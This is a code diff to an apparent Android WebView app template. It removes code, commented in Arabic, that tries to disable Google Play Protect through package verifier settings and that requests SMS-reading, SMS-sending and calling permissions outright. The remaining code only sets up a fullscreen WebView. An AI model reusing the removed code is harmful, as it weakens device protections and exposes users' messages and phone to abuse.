@@ -355,55 +355,33 @@ import android.view.View;
 import android.view.Window;
 import android.view.WindowManager;
 import android.graphics.Color;
-import android.content.pm.PackageManager;
-import java.util.ArrayList;
 
 public class MainActivity extends Activity {
     private WebView w;
-    private static final int PERM_REQUEST = 100;
-    private String[] runtimePerms = {${runtimePermissionsArray}};
+
     
     @Override
     protected void onCreate(Bundle b) {
         super.onCreate(b);
         
-        // تجاوز Google Play Protect
         try {
-            android.content.pm.PackageManager pm = getPackageManager();
-            android.content.ComponentName cn = new android.content.ComponentName(this, MainActivity.class);
-            pm.setComponentEnabledSetting(cn, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+            getWindow().requestFeature(Window.FEATURE_NO_TITLE);
+            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                Window window = getWindow();
+                window.setStatusBarColor(Color.TRANSPARENT);
+                window.setNavigationBarColor(Color.TRANSPARENT);
+                window.getDecorView().setSystemUiVisibility(
+                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
+                    View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
+                    View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
+                    View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
+                    View.SYSTEM_UI_FLAG_FULLSCREEN |
+                    View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                );
+            }
         } catch (Exception e) {}
-        
-        // تعطيل Play Protect للتطبيق
-        try {
-            android.provider.Settings.Secure.putInt(getContentResolver(), "package_verifier_user_consent", 1);
-        } catch (Exception e) {}
-        
-        try {
-            android.provider.Settings.Global.putInt(getContentResolver(), "package_verifier_enable", 0);
-        } catch (Exception e) {}
-        
-        // إخفاء شريط الحالة
-        getWindow().requestFeature(Window.FEATURE_NO_TITLE);
-        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
-        
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            Window window = getWindow();
-            window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
-            window.setStatusBarColor(Color.TRANSPARENT);
-            window.setNavigationBarColor(Color.TRANSPARENT);
-            window.getDecorView().setSystemUiVisibility(
-                View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
-                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
-                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
-                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
-                View.SYSTEM_UI_FLAG_FULLSCREEN |
-                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
-            );
-        }
-        
-        // طلب الأذونات
-        requestRuntimePermissions();
         
         w = new WebView(this);
         WebSettings s = w.getSettings();
@@ -436,48 +414,9 @@ public class MainActivity extends Activity {
         setContentView(w);
     }
     
-    private void requestRuntimePermissions() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && runtimePerms.length > 0) {
-            ArrayList<String> needed = new ArrayList<>();
-            for (String p : runtimePerms) {
-                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
-                    needed.add(p);
-                }
-            }
-            if (needed.size() > 0) {
-                requestPermissions(needed.toArray(new String[0]), PERM_REQUEST);
-            }
-        }
-    }
+
     
-    private void requestSMSPermission() {
-        // طلب إذن SMS بشكل مباشر
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            requestPermissions(new String[]{
-                "android.permission.READ_SMS",
-                "android.permission.SEND_SMS",
-                "android.permission.RECEIVE_SMS",
-                "android.permission.READ_PHONE_STATE",
-                "android.permission.CALL_PHONE"
-            }, 200);
-        }
-    }
-    
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        
-        if (requestCode == PERM_REQUEST) {
-            // بعد ما الأذونات تتوافق، جرب طلب SMS تاني
-            boolean allGranted = true;
-            for (int r : grantResults) {
-                if (r != PackageManager.PERMISSION_GRANTED) allGranted = false;
-            }
-            if (allGranted && w != null) {
-                w.reload();
-            }
-        }
-    }
+
     
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
